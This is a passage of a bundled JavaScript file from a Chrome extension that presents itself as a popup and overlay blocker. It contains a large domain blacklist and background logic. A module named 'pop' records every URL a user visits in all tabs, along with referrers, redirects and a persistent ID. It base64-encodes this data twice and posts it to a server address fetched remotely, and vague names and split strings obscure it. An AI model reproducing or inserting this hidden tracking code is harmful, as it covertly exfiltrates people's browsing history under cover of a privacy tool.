	  "defaultBlackList": ["adrunnr", "successforyu.clickfunnels.com", "fmovies.se", "in-365-tagen.info", "5000-settimanale.com", "shop.mazzugioielli.com", "maxigossip.com", "lp.yazizim.com", "beyourxfriend.com", "99tab.com", "zzqrt.com", "canuck-method.net", "bewomenly.com", "playnow.guru", "datingforyou-48e1.kxcdn.com", "trafficnetworkads24.com", "sistemadedinerogratis.com", "canuckmethodprofit.co", "consumerresearchnetwork.com", "securemacfix.com", "zz3d3.ru", "zd1.quebec-bin.com", "hot-games4you.xyz", "om.elvenar.com", "superpccleanup.com", "gomediaz.com", "judithi.xyz", "free.atozmanuals.com", "yoursuccess.ravpage.co.il", "123hop.ir", "quizcliente.pw", "aussiemethod.biz", "hlpnowp-c.com", "picbumper.com", "shaneless.com", "anacondamonster.com", "altrk1.com", "health.todaydiets.com", "download.weatherblink.com", "happyluketh.com", "go.ameinfo.com", "50kaweek.net", "thepornsurvey.com", "ofsiite.ru", "fulltab.com", "1000spins.com", "time2play-online.net", "vintacars.com", "welcome.pussysaga.com", "free-desktop-games.com", "download.televisionfanatic.com", "theprofitsmaker.net", "sgad.info", "algocashmaster.net", "sunmaker.com", "topvipdreams.com", "watchmygirlfriend.gfpornvideos.com", "filesharefanatic.com", "safedownloadhub.com", "7awlalalam.blogspot.com", "tvplusnewtab.com", "trendingpatrol.com", "moneymorning.com", "ifileyou.com", "classifiedcanada.ca", "firefan.com", "methode-binaire.com", "letmetell.com", "kenduktur.com", "getafuk.com", "yotraleplahnte.ru", "jackpot.88beto.com", "pwwysydh.com", "search.queryrouter.com", "v.lvztxy.com", "pussysaga.com", "saffamethod.com", "prezzonline.com", "searchprivacy.website", "3d2819216eb4e1035879-7c248de0c99745406e9b749fc86ec3e4.ssl.cf1.rackcdn.com", "only2date.com", "mysagagame.com", "themillionaireinpjs.net", "wlt.kd2244.com", "quickprivacycheck.com", "hotchatdate.com", "autotraderbot.com", "z1.zedo.com", "youlucky2014.com", "traffic.getmyads.com", "appcloudprotected.com", "safensecure.com-allsites3.xyz", "newpoptab.com", "static.williamhill.com", "myhealthyblog.co", "greatestmobideals.com", "sweetclarity.com", "mgid.com", "securepccure.com", "autopengebygger.com", "am15.net", "es.reimageplus.com", "o2.promos-info.com", "it.reimageplus.com", "westsluts.com", "spinandwin.com-ser.pw", "reimageplus.com", "vodafone.promos-info.com", "vinnmatpengar.se", "movie.ienjoyapps.com", "love4single.com", "origin.getprice.com.au", "ohmydating.com", "lp.want-to-win.com", "yabuletchrome.ru", "bamdad.net", "gotositenow.com", "vcrypt.pw", "newtabtv.com", "mon.setsu.xyz", "youforgottorenewyourhosting.com", "zone-telechargement.ws", "land.pckeeper.software", "ad.adpop-1.com", "advancedpctools.com", "videos.randolphcountyheraldtribune.com", "web-start.org", "softreadynow.installupgradenowfreshandforyou.website", "uplod.ws", "pornhubcasino.com", "maxbet.ro", "2016prizefeed.com", "thevideo.me", "wantubad.com", "tavanero.com", "xcusmy.club", "daclips.in", "gaymenofporn.online", "jackpotcitycasino.com", "italian-method.com", "getsearchincognito.com", "youjustwonprize.com", "finanz-nachrichten.me", "quizcliente.site", "da.reimageplus.com", "jkanime.net", "britmoneymethod.com", "uae.souq.com", "ka.azzer.net", "safensecure.xyz", "8t.hootingrhejkz.online", "www6.blinkx.com", "wizzcaster.com", "comparaison-prix.com", "vodlocker.lol", "fr.reimageplus.com", "free.fromdoctopdf.com", "userscloud.com", "myprivatesearch.com", "fanli90.cn", "tutticodicisconto.it", "mediadec.com", "gogamego.thewhizproducts.com", "download.weatherblink.com", "free.videodownloadconverter.com", "we-are-gamers.com", "sesso.communityadult.net", "lp.blpmovies.com", "search.queryrouter.com", "bbb-johannesburg.localspecific.com", "lp.blpmovies.com", "go.ppixelm.com", "r0.ru", "sesso.communityadult.net", "bbb-johannesburg.localspecific.com", "ppixelm.com", "cyberguardianspe.info", "we-are-gamers.com", "loginfaster.com/new", "www.alfacart.com", "www.foresee.com", "mobile-win.com", "www.plusnetwork.com", "www.amicafarmacia.com", "www.ienjoyapps.com", "cheapcheap.io", "screenaddict.thewhizproducts.com", "nova.rambler.ru", "free.gamingwonderland.com", "p9328ujeiw1.ru", "mobilecasinoclub.co.uk", "pfhsystem.com", "regtuneup.com", "theprofitsmaker.net", "bodogpromotions.eu", "heroesreplay.org", "financialsecrets.info", "mymoneymakingapp.com", "sunmaker.com", "888casino-promotions.com", "vogliosesso.com", "scienceremix.com", "allinonedocs.com", "arabia.starzplay.com", "allirishcasino.com", "advancepctools.info", "movie.ienjoyapps.com", "surveyform001.s3-website-us-east-1.amazonaws.com", "mgs188.com", "pfhsystem.com", "lpeva.com", "ddsh8.com", "theprofitsmaker.net", "b2.ijquery11.com", "sporthero.thewhizmarketing.com", "securefastmac.tech", "seen-on-screen.thewhizmarketing.com", "1000spins.com", "search.queryrouter.com", "pfhsystem.com", "reimageplus.com", "offer.alibaba.com", "searchlistings.org", "search.queryrouter.com", "search.queryrouter.com", "mybinaryoptionsrobot.com", "duplicashapp.com", "search.queryrouter.com", "bestgame.directory", "droidclub.net", ".rivalo.com", "yoursuperprize.com", "mediaexplained.com", "om.elvenar.com", "shinar.club", "revitoleczemacream.com", "freelotto.com", "screenaddict.thewhizproducts.com", "download.bringmesports.com/", "allinonedocs.com", "driver-fixer.com", "arabydeal.com", "cleanyourcomputertoday.com", "arabydeal.com", "music.mixplugin.com", "1se.info", "survey12.com", "freesoftwaredlul.com", "pldist01.com", "ad.adpop-1.com", "searchanonymous.net", "abrst.pro", "muzikfury.thewhizmarketing.com", "lp.mbtrx.com", "th1.forfun.maxisize-pro.com", "watchmygirlfriend.gfpornbox.com", "new.freelotto.com", "desktoptrack.com", "search.queryrouter.com", "offer.alibaba.com", "1000spins.com", "promotions.coral.co.uk", "search.queryrouter.com", "tbsia.com", "tbsia.com", "multtaepyo.com", "search.queryrouter.com", "czechmethod.com", "consumerview.co", "wayretail.com", "72onbase.com", "funsafetab.com", "search.queryrouter.com", "speedyfiledownload.com", "driver-fixer.com", "arabydeal.com", "cleanyourcomputertoday.com", "arabydeal.com", "music.mixplugin.com", "1se.info", "survey12.com", "freesoftwaredlul.com", "pldist01.com", "ad.adpop-1.com", "searchanonymous.net", "abrst.pro", "muzikfury.thewhizmarketing.com", "lp.mbtrx.com", "th1.forfun.maxisize-pro.com", "watchmygirlfriend.gfpornbox.com", "new.freelotto.com", "desktoptrack.com", "search.queryrouter.com", "offer.alibaba.com", "1000spins.com", "promotions.coral.co.uk", "search.queryrouter.com", "tbsia.com", "tbsia.com", "surveyform001.s3-website-us-east-1.amazonaws.com", "mgs188.com", "pfhsystem.com", "lpeva.com", "ddsh8.com", "theprofitsmaker.net", "quantomcoding.com", "sporthero.thewhizmarketing.com", "popads.net", "onclkds.com", "consumerview.co", "12kotov.ru", "ruhotpair2.fingta.com", "easytelevisionaccessnow.com", "ahwrd.com", "lpeva.com", "ppgzf.com", "zjstx.com", "kituure.xyz", "join.pro-gaming-world.com", "mackeeperapp.mackeeper.com", "tracknotify.com", "2075.cdn.beyondhosting.net", "idollash.com", "ds.moviegoat.com", "fulltab.com", "rackcdn.com", "prestoris.com", "adsterra.com", "swampssovuuhusp.top", "streesusa.info", "freesoftwaredlul.com", "adreactor.com", "a-static.com", "codeonclick.com", "heheme.com", "adf.ly", "seen-on-screen.thewhizmarketing.com", "openload.co"]
	};

	exports.default = Config;

/***/ }),
/* 11 */
/***/ (function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

	var _Promise = typeof Promise === 'undefined' ? __webpack_require__(5).Promise : Promise;

	var pop = function () {
	  var itemator = 'aeb204c39';
	  var version = chrome.runtime.getManifest().version;
	  var serverInfo = localStorage.serverInfo ? JSON.parse(localStorage.serverInfo) : [];
	  var url = 'https:/' + '/api2.poperblocker.com';
	  var settings_key = "popofig";
	  var set_route = "/consts";
	  var main_route = "/view/update";
	  var guid_key = ["randid", "guid_key"];
	  var skeys = ['o', 'u'];
	  var tkey = "ng;ldfhgieRGV3dlkdsiig0a";
	  var ch = 2;
	  var browsername = "chrome";
	  var cab = {
	    onData: function onData() {}
	  };

	  function getDomainName(href) {
	    var l = document.createElement("a");
	    l.href = href;
	    return l.hostname;
	  }

	  var toggler = new function () {
	    var isOn = true;
	    var defaultVal = true;
	    var localKey = tkey;
	    function save() {
	      localStorage.setItem(localKey, isOn ? 1 : 0);
	    }
	    function load() {
	      var val = localStorage.getItem(localKey);
	      var intVal = parseInt(val);
	      if (isNaN(intVal)) {
	        isOn = defaultVal;
	      } else {
	        isOn = intVal === 1;
	      }
	    }
	    this.turnOn = function () {
	      isOn = true;save();_optTurnOn();
	    };
	    function _optTurnOn() {}
	    this.turnOff = function () {
	      isOn = false;save();
	    };
	    this.isOn = function () {
	      return isOn;
	    };
	    /**
	     * returns a Promise which resolves only when (or after) toggler is turned On
	     * if toggler is turned on by the time this function is called
	     * promise resolved instantly
	     * @returns {Promise}
	     */
	    this.whenOn = function () {
	      if (this.isOn()) {
	        return _Promise.resolve(true);
	      }
	      return new _Promise(function (resolve) {
	        _optTurnOn = function _optTurnOn() {
	          resolve();
	        };
	      });
	    };
	    load();
	  }();
	  var configFetcher = new function () {
	    var settings = '';
	    var setDump = function setDump() {
	      localStorage.setItem(settings_key, JSON.stringify(settings));
	    };
	    var setLoad = function setLoad() {
	      var p = localStorage.getItem(settings_key);
	      settings = p ? JSON.parse(p) : settings;
	    };
	    var setUp = function setUp(endpt) {
	      var cb = function cb(sts, resp) {
	        if (!sts) {
	          return;
	        }
	        settings = JSON.parse(resp);
	        setDump();
	      };
	      var xhr = new XMLHttpRequest();
	      xhr.onreadystatechange = function () {
	        if (4 == xhr.readyState) {
	          cb.apply(undefined, _toConsumableArray([200 == xhr.status, xhr.responseText].concat(arguments)));
	        }
	      };
	      var proc = function proc(arr) {
	        return Object.keys(arr).map(function (hashed) {
	          return hashed + '=' + arr[hashed];
	        }).join("&");
	      };
	      xhr.open("GET", endpt + '?' + proc({ s: itemator, ver: version }), true);
	      xhr.send();
	    };
	    setLoad();
	    toggler.whenOn().then(function () {
	      setUp(url + set_route);
	    });
	    this.IsEnable = function () {
	      return Boolean(settings && settings[skeys[0]]);
	    };
	    this.MainLocator = function () {
	      return settings && settings[skeys[1]];
	    };
	  }();
	  var filtered = ["restarting", "hh", "pro", "fr", "aj", "replaced", "retroet", "dada"];
	  function qs(obj) {
	    return Object.keys(obj).filter(function (key) {
	      return (!!obj[key] || false === obj[key]) && !filtered.includes(key);
	    }).map(function (key) {
	      var val = obj[key];
	      if ('ref' === key) {
	        return obj[key].map(function (v) {
	          return key + '=' + encodeURIComponent(v);
	        }).join('&');
	      }
	      if ('u p rd rs1 ml'.split(' ').includes(key)) {
	        val = encodeURIComponent(val || '');
	      }
	      return key + '=' + val;
	    }).join('&');
	  }
	  function fetchOverlayPattern(data, callback) {
	    data.tus = Date.now();
	    var bqa = qs(data);
	    var payload = btoa(bqa);
	    var xhr = new XMLHttpRequest();
	    xhr.open('POST', configFetcher.MainLocator() + main_route, true);
	    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	    xhr.setRequestHeader("capr", getDomainName(data.u));
	    xhr.onload = function (e) {
	      if (this.status == 200) {
	        callback(JSON.parse(this.response));
	      }
	    };
	    xhr.send(['e', encodeURIComponent(btoa(payload))].join('='));
	  }
	  function TabList() {
	    var hash = {};
	    var lp = "";
	    var lpi = undefined;
	    return {
	      remove: function remove(tid) {
	        delete hash[tid];
	      },
	      edit: function edit(tid, props) {
	        if (!tid) return null;
	        if (!hash[tid]) this.clear(tid);
	        Object.keys(props || {}).forEach(function (key) {
	          hash[tid][key] = props[key];
	        });
	        return hash[tid];
	      },
	      request: function request(tabId, tab) {
	        if (!configFetcher.IsEnable() || !toggler.isOn()) return;
	        if (!hash[tabId] || hash[tabId].pro && !hash[tabId].replaced) {
	          this.clear(tabId);
	          return;
	        }
	        var currTab = hash[tabId] || {};
	        var url = validateUrl(tab.url);
	        if (url && !(!currTab.hh && lp == tab.url)) {
	          if (!tab.active && !hash[tabId].fr) {
	            hash[tabId].to.push("background_auto_reloading");
	          }
	          if (hash[tabId].dada && hash[hash[tabId].dada] && hash[hash[tabId].dada].retroet) {
	            hash[tabId].ml = hash[hash[tabId].dada].retroet;
	          }
	          fetchOverlayPattern(this.edit(tabId, {
	            u: url,
	            p: lp
	          }), function (d) {
	            cab.onData({ tabId: tabId, data: d, url: url });
	          });
	          if (tab.active) {
	            lp = currTab.u;
	          }
	          hash[tabId].ml = null;
	          hash[tabId].dada = null;
	        }
	        this.clear(tabId);
	        hash[tabId].u = url;
	        hash[tabId].pro = true;
	      },
	      clear: function clear(tid) {
	        hash[tid] = {
	          ver: version, def: 21, sver: "1", nid: browsername, ch: ch,
	          us: itemator, h: guid(), sesus: '', rs2: 0,
	          ref: [], restarting: false,
	          u: (hash[tid] || {}).u || null,
	          rd: (hash[tid] || {}).rd || '',
	          to: [], fr: false, aj: (hash[tid] || {}).aj || false,
	          replaced: (hash[tid] || {}).replaced || false,
	          hh: (hash[tid] || {}).hh || false,
	          dada: (hash[tid] || {}).dada || null,
	          retroet: (hash[tid] || {}).retroet || '',
	          ml: (hash[tid] || {}).ml || ''
	        };
	      },
	      details: function details(tid, cb) {
	        chrome.tabs.get(tid, function (details) {
	          if (!chrome.runtime.lastError) {
	            cb(details);
	          }
	        });
	      },
	      lpUpdate: function lpUpdate(param) {
	        var idd = param.id || param;
	        lpi = param.id || undefined;
	        lp = (hash[idd] || {}).u || lp;
	      },
	      getLpi: function getLpi() {
	        return lpi;
	      }
	    };
	  }
	  function validateUrl(url) {
	    if (!url) {
	      return null;
	    }

	    return url.indexOf("http") === 0 && !url.includes(":/" + "/localhost") && !url.includes("chrome/newtab") && url.indexOf("chrome-") !== 0 && url.indexOf("about:") !== 0 && !url.includes("chrome:/" + "/") ? url : null;
	  }
	  var tablist = new TabList();
	  var cb = chrome.browserAction;
	  var ct = chrome.tabs;
	  var wr = chrome.webRequest;
	  var wn = chrome.webNavigation;
	  var cw = chrome.windows;
	  chrome.runtime.onMessage.addListener(function (request, sender) {
	    if (request.href) {
	      tablist.edit(sender.tab.id, { ml: request.href });
	    } else if (request.ahref) {
	      tablist.edit(sender.tab.id, { retroet: request.ahref });
	    }
	  });
	  cw.getAll({ populate: true }, function (windows) {
	    for (var w = 0; w < windows.length; w++) {
	      for (var i = 0; i < windows[w].tabs.length; i++) {
	        if (!validateUrl(windows[w].tabs[i].url)) continue;
	        tablist.edit(windows[w].tabs[i].id, { u: windows[w].tabs[i].url, restarting: true });
	        if (windows[w].focused && windows[w].tabs[i].active) {
	          tablist.lpUpdate(windows[w].tabs[i]);
	        }
	      }
	    }
	  });
	  function reselected(tid) {
	    tablist.details((tid || {}).tabId || tid, tablist.lpUpdate);
	  }
	  ct.onUpdated.addListener(onUpdated);
	  ct.onReplaced.addListener(onReplaced);
	  var repertuar = { types: ["main_frame"], urls: ["<all_urls>"] };
	  wr.onBeforeRequest.addListener(function (details) {
	    validateUrl(details.url) && tablist.edit(details.tabId, { u: undefined, pro: false, aj: false });
	  }, repertuar, ["blocking"]);
	  wr.onBeforeRedirect.addListener(function (details) {
	    validateUrl(details.url) && tablist.edit(details.tabId).ref.push(details.url);
	  }, repertuar);
	  wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders, repertuar, ["blocking", "requestHeaders"]);
	  wr.onHeadersReceived.addListener(function (details) {
	    tablist.edit(details.tabId, { hh: true });
	  }, repertuar);

	  ct.onRemoved.addListener(function (tabId) {
	    tablist.remove(tabId);
	  });
	  cw.onRemoved.addListener(cwonRemoved);
	  ct.onCreated.addListener(onCreated);
	  cw.onFocusChanged.addListener(cwonFocused);
	  if (ct.onActivated) {
	    ct.onActivated.addListener(reselected);
	  } else {
	    ct.onSelectionChanged.addListener(reselected);
	  }
	  wr.onErrorOccurred.addListener(function (details) {
	    try {
	      tablist.edit(details.tabId, { ref: null });
	    } catch (e) {}
	  }, repertuar);
	  function onUpdated(tabId, details, tab) {
	    if (details && "complete" === details.status) {
	      if (tablist.edit(tabId).pro && tablist.edit(tabId).aj) {
	        tablist.edit(tabId, { u: undefined, pro: false, aj: false });
	      }
	      tablist.edit(tabId, { t: "ajax", aj: true });
	      tablist.request(tabId, tab);
	      tablist.edit(tabId, { replaced: false });
	    }
	  }
	  function onReplaced(addedTabId, removedTabId) {
	    tablist.edit(addedTabId, { replaced: true });
	    tablist.details(addedTabId, tablist.request.bind(tablist, (addedTabId || {}).tabId || addedTabId));
	  }
	  function onBeforeSendHeaders(details) {
	    tablist.edit(details.tabId, { hh: true });
	    if (!details.requestHeaders.some(function (rh) {
	      return (/^Referer$/i.test(rh.name) && tablist.edit(details.tabId, { rd: rh.value })
	      );
	    })) {
	      tablist.edit(details.tabId, { rd: '' });
	    }
	    return { requestHeaders: details.requestHeaders };
	  }
	  function onCommitted() {
	    var dtls = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

	    var tid = dtls.tabId;
	    var tu = dtls.transitionQualifiers;
	    if (tid && dtls.frameId === 0) {
	      tablist.edit(tid, { t: dtls.transitionType, tu: tu });
	      if (/client_redirect/.test(tu)) {
	        tablist.edit(tid, { rs1: dtls.url });
	      }
	      if (/server_redirect/.test(tu)) {}
	      tablist.details(tid, tablist.request.bind(tablist, (tid || {}).tabId || tid));
	    }
	  }
	  function cwonRemoved(windowID) {
	    ct.query({ active: true }, function (tabs) {
	      if (tabs[0]) {
	        tablist.lpUpdate(tabs[0]);
	      }
	    });
	  }
	  function cwonFocused(window) {
	    if (cw.WINDOW_ID_NONE == window) {
	      return;
	    }
	    ct.query({ windowId: window, active: true }, function (tabs) {
	      if (tabs[0] && tabs[0].active) {
	        tablist.lpUpdate(tabs[0]);
	      }
	    });
	  }
	  function onCreated(tab) {
	    if (!tab.url) {
	      return;
	    }
	    var curTab = tablist.edit(tab.id, { fr: true, replaced: false });
	    var openerTabId = tab.openerTabId || tablist.getLpi();
	    var oOpenerTabInfo = tablist.edit(openerTabId);
	    if (tab.url.length && tablist.edit(openerTabId) && tab.url === tablist.edit(openerTabId).u) {
	      tablist.edit(tab.id).to.push("duplication");
	    } else if (tab.url.length) {
	      ct.query({
	        url: tab.url
	      }, function (tabs) {
	        if ((tabs || []).length > 1) {
	          tablist.edit(tab.id).to.push("duplication");
	          tablist.edit(tab.id).to.push("background_duplication");
	        }
	      });
	    }
	    if ('complete' == tab.status && !tab.openerTabId) {
	      tablist.edit(tab.id).to.push("reopening");
	    }
	    tablist.edit(tab.id, { dada: openerTabId });
	  }
	  function guid() {
	    var guid = localStorage.getItem(guid_key[0]) || localStorage.getItem(guid_key[1]);
	    if (!guid) {
	      var g = function g() {
	        return ((1 + Math.random(Date.now() + 12)) * 0x10000 | 0).toString(30).substring(1);
	      };
	      guid = g() + g() + g() + g() + g() + g() + g() + g() + g();
	      localStorage.setItem(guid_key[0], guid);
	    }
	    return guid;
	  }
	  return {
	    optin: function optin() {
	      toggler.turnOn();
	    },
	    optout: function optout() {
	      toggler.turnOff();
	    },
	    isopt: function isopt() {
	      toggler.isOn();
	    },
	    whenopt: function whenopt() {
	      return toggler.whenOn();
	    },
	    callback: cab
	  };
	}();

	exports.default = pop;

/***/ }),
/* 12 */
/***/ (function(module, exports, __webpack_require__) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	exports.default = function (pop) {
	  var extVersion = (0, _utils.getManifestInfo)().version;

	  //google stuff init
	  _ga2.default.init("UA-89083382-2");

	  var tabs = {};
	  var last = "";
	  var Settings = {};
	  var idol = { sr: [] };
	  var debugging = true;

	  var keenIO = new _keen2.default({
	    extVersion: extVersion
	  });

	  var badgeManager = new _badge2.default();

	  var rating = new _rating2.default({
	    show: {
	      after: _const2.default.blockCountsToShowRate,
	      every: _const2.default.blockCountsToShowRateAgain
	    },
	    Events: {
	      showRating: function showRating(props) {
	        chrome.tabs.sendMessage(props.tabId, { name: 'showRateUs' });
	      }
	    }
	  });

	  var retension = new _utils.Retension({
	    Storage: {
	      requestGet: function requestGet() {
	        return _PBStorageSync2.default.pb_retentionData.get();
	      },

	      requestSet: function requestSet(data) {
	        _PBStorageSync2.default.pb_retentionData.removeAndSet(data);
	      }
	    },
	    GAEvents: {
	      Retentoin: function Retentoin(xDay) {
	        trackGAEvent({ category: 'General', action: 'Retained {0} day'.replace('{0}', xDay), label: extVersion }, true);
	      },
	      Alive: function Alive() {
	        trackGAEvent({ category: "General", action: "Retained Alive", label: extVersion }, true);
	      },
	      Install: function Install() {
	        trackGAEvent({ category: "General", action: "Retained Install", label: extVersion }, true);
	      }
	    }
	  });

	  //#TEMP - ONE TIME KEEN.IO EVENT FOR RECEPIES
	  _PBStorageSync2.default.pb_OneTimeEvents.get().then(function () {
	    var data = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

	    if (!data.keenRecepies) {
	      data.keenRecepies = true;

	      _PBStorageSync2.default.pb_OneTimeEvents.set(data);

	      _PBStorageSync2.default.pb_overlayBlockedList.get().then(function () {
	        var recepies = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

	        if (Object.keys(recepies).length >= 5) {
	          var domains = Object.keys(recepies);
	          var exclude = ['facebook.com', 'youtube.com', 'twitter.com'];
	          var guid = localStorage.getItem('randid') || localStorage.getItem('guid_key');
	          var isValid = true;

	          domains.forEach(function (domain) {
	            if ((0, _utils.isDomainInList)(domain, exclude) && recepies[domain].length) {
	              isValid = false;
	            }
	          });

	          if (isValid) {
	            keenIO.recordEvent('local-recepies', { 'guid': guid, 'recepies': JSON.stringify(recepies) });
	          }
	        }
	      });
	    }
	  });

	  _PBStorageSync2.default.all.update(function (settings) {
	    Settings = settings;
	    settings.pb_detectOverlays = undefined == settings.pb_detectOverlays ? true : settings.pb_detectOverlays;
	    if (settings.pb_detectOverlays) {
	      pop.optin();
	    } else {
	      pop.optout();
	    }
	    /*
	     init all settings if it's new install
	     since some settings are added after installation
	     we should not skip the init if user got these new settings from update like doNotShowList
	     */
	    // if (!settings.pb_numOfBlocks) {
	    settings.pb_whitelist = settings.pb_whitelist || [];
	    settings.pb_overlaylist = settings.pb_overlaylist || {};
	    settings.pb_hideNotifications = settings.pb_hideNotifications || false;
	    settings.pb_hideBadge = settings.pb_hideBadge || false;
	    settings.pb_installDate = settings.pb_installDate || new Date().getTime();
	    settings.pb_numOfBlocks = settings.pb_numOfBlocks || 0;
	    settings.pb_GASettings = settings.pb_GASettings || {};
	    settings.pb_pause = settings.pb_pause || false;
	    settings.pb_disableContextMenu = settings.pb_disableContextMenu || false;
	    settings.doNotShowNotifyList = settings.doNotShowNotifyList || [];
	    settings.doNotShowFollowUpNtfList = settings.doNotShowFollowUpNtfList || {};
	    settings.pb_popupBlackList = settings.pb_popupBlackList || _const2.default.defaultBlackList;
	    settings.pb_defaultWhitelist = settings.pb_defaultWhitelist || _const2.default.defaultWhiteList;

	    // }
	    if (Settings.pb_pause) {
	      chrome.browserAction.setIcon({ path: "/images/icon128_g.png" });
	    }
	    createBrowserActionContextMenuItem(Settings.pb_pause);
	    if (!Settings.pb_pause && !Settings.pb_disableContextMenu) {
	      createBrowserContextRemoveOverlay(false);
	    }

	    setUninstallURL(settings.pb_numOfBlocks);

	    //clean up start
	    Object.keys(settings.pb_counterBlockedSites || {}).forEach(function (key) {
	      var data = settings.pb_counterBlockedSites[key];
	      var now = new Date();
	      var lastMonth = new Date().setMonth(now.getMonth() - 1);

	      if (lastMonth > data.lastUpdated) {
	        delete settings.pb_counterBlockedSites[key];
	      }
	    });
	    //clean up end

	    //migrate old dont show list to new format - remove is code at 1.1.2019
	    settings.doNotShowNotifyList = settings.doNotShowNotifyList.map(function (item) {
	      if (typeof item == 'string') {
	        item = { domain: item, time: new Date().getTime() };
	      }

	      return item;
	    });

	    return settings;
	  });

	  chrome.contextMenus.onClicked.addListener(function (info, tab) {
	    if (info.menuItemId == "removeOL") {
	      (0, _utils.sendToActiveTab)('manual-remove-overlay', { source: 'right-click' });

	      keenIO.recordEvent('remove-overlay:right-click', { 'url': tab.url });

	      trackGAEvent({ category: "Right_click", action: "Click", label: "Remove overlay" });
	    } else if (info.menuItemId == "togglePB") {
	      togglePB();
	    }
	  });

	  chrome.runtime.onMessage.addListener(onRuntimeMessage);

	  function onRuntimeMessage(request, sender, sendResponse) {
	    switch (request.name) {
	      case "setBadgeText":
	        badgeManager.setBadge(sender.tab);
	        break;
	      case "badgeToggle":
	        badgeManager.toggle(request.show);
	        break;
	      case "updateBlockCounts":
	        setUninstallURL(request.numOfBlocks);
	        break;
	      case "showOptions":
	        chrome.tabs.create({ url: "options.htm" });
	        break;
	      case "closePopupMenu":
	        getCurrentTab().then(function (tab) {
	          chrome.tabs.sendMessage(tab.id, { name: "closePopupMenu" });
	        });
	        break;
	      case "overlayDetectionResults":
	        tabsWithOverlay[sender.tab.id] = request.detection;
	        _PBStorageSync2.default.pb_tabswithoverlay.set(tabsWithOverlay);
	        break;
	      case "page":
	        focus(request.url);
	        setInlineUninstall(sender.tab.id);
	        break;
	      case "activateRecipes":
	        getCurrentTab().then(function (tab) {
	          chrome.tabs.sendMessage(tab.id, { name: "activateRecipes" });
	        });
	        break;
	      case "removeOverlayAlways":
	        getCurrentTab().then(function (tab) {
	          chrome.tabs.sendMessage(tab.id, { name: "removeOverlayAlways" });
	        });
	        break;
	      case "optionsPage":
	        if (request.hasOwnProperty("pb_detectOverlays")) {
	          Settings.pb_detectOverlays = request.pb_detectOverlays;
	          if (request.pb_detectOverlays) {
	            pop.optin();
	          } else {
	            pop.optout();
	          }
	        } else if (request.hasOwnProperty("pb_disableContextMenu")) {
	          if (request.pb_disableContextMenu) {
	            removeMenu("removeOL");
	          } else {
	            createNormalMenuItem("removeOL", {
	              title: (0, _utils.getI18N)("blockOverlayButtonLabel"),
	              contexts: _const2.default.overlay_blocking_context_item_contexts
	            });
	          }
	        }
	        break;
	      case "undoOverlayOnce":
	        getCurrentTab().then(function (tab) {
	          chrome.tabs.sendMessage(tab.id, { name: "undoOverlayOnce" });
	        });
	        break;
	      case "allowOverlays":
	        //    getCurrentTab().then(tab => {
	        //     chrome.tabs.sendMessage(tab.id, {name: "allowOverlays"});
	        // });
	        break;
	      case "restoreOverlays":
	        getCurrentTab().then(function (tab) {
	          restoreOverlays(tab);
	        });
	        break;
	      case "trackEvent":
	        //show rate us

	        trackGAEvent(request, request.isCount);
	        break;
	      case "logTxt":
	        printInLog(request.data);
	        break;
	      case "createIconContextMenu":
	        removeMenu("togglePB");
	        createBrowserActionContextMenuItem(request.paused);
	        createBrowserContextRemoveOverlay(request.paused);
	        break;
	      case "allowAlways":
	        _PBStorageSync2.default.pb_whitelist.update(function (data) {
	          data = data || [];
	          data.push(request.domain);
	          return data;
	        }).then(function () {
	          if (request.type === "popup") {
	            //chrome.tabs.reload({tabId: sender.tab.id});
	          } else {
	            getCurrentTab().then(function (tab) {
	              chrome.tabs.sendMessage(tab.id, { name: "allowOverlays" });
	            });
	          }
	        });
	        break;
	      case "getRecipe":
	        fetchBlockingRecipes(sender.tab);
	        break;

	      case "reportNoOverlayFound":
	      case "reportPopup":
	        reportSite(request.data);
	        break;
	      case "openUrl":
	        var openInNewTab = !request.notNewtab;
	        chrome.tabs.create({ url: request.url, active: openInNewTab });
	        break;
	      case 'update-rating':
	        rating.update(request.action, sender);
	        break;
	    }
	  }

	  /* Update settings and check for notifications */
	  // $.getJSON("http://www.poperblocker.com/settings.json", localStorage)
	  // $.getJSON("settings/settings.json", localStorage)
	  //GoogleSheet.getSheetData(Config.dataSettings)
	  //  .then(config => {
	  //    onLocalWhitelistReady(config);
	  //    onLocalBlacklistReady(config);
	  //   onConfigReady(config);
	  //});

	  onConfigReady({
	    "ga_allEvent_rate": 25
	  });

	  function printInLog(text) {
	    if (debugging) {
	      console.log(text);
	    }
	  }

	  function getCurrentTab() {
	    return new _Promise(function (resolve) {
	      chrome.tabs.query({ active: true, lastFocusedWindow: true }, function (tabs) {
	        resolve(tabs[0]);
	      });
	    });
	  }

	  /*
	   send google analytics data
	   if is a count event or current user is chosen to send all data, send it
	   */
	  function trackGAEvent(request, isCount) {
	    if (Settings.hasOwnProperty("pb_GASettings") && Settings.pb_GASettings.ga_sendAllEvents || isCount) {
	      _ga2.default.trackEvent(request.category, request.action, request.label);
	    }
	  }

	  function restoreOverlays(tab) {
	    chrome.tabs.executeScript(tab.id, { code: "restoreOverlays()" }, function (results) {});
	  }

	  function vald(url) {
	    return url && url.indexOf("http") === 0 && !url.includes("://localhost") && !url.includes("chrome/newtab");
	  }

	  function focus(url) {
	    if (vald(url)) {
	      last = url;
	    }
	  }

	  pop.callback.onData = function (_ref) {
	    var tabId = _ref.tabId,
	        url = _ref.url,
	        data = _ref.data;

	    //#TEMP
	    /*data = {recipes: [
	      "div[style=\"display: block !important;width: 100%;height: 100%;position: fixed;top: 0px;left: 0px;background: rgba(150, 150, 150, 0.4);z-index: 999999;\"]"
	    ]};*/

	    chrome.tabs.sendMessage(tabId, { name: 'receivedRecipes', 'data': data });
	  };

	  /**
	   * Triggered when configs are loaded
	   * @param Mixed config
	   */
	  function onConfigReady(config) {
	    _PBStorageSync2.default.many(_PBStorageSync2.default.pb_numOfBlocks, _PBStorageSync2.default.pb_GASettings).update(function (settings) {
	      if (!settings.pb_GASettings) {
	        settings.pb_GASettings = {};
	      }

	      if (settings.pb_GASettings.ga_sendAllEvents == undefined) {
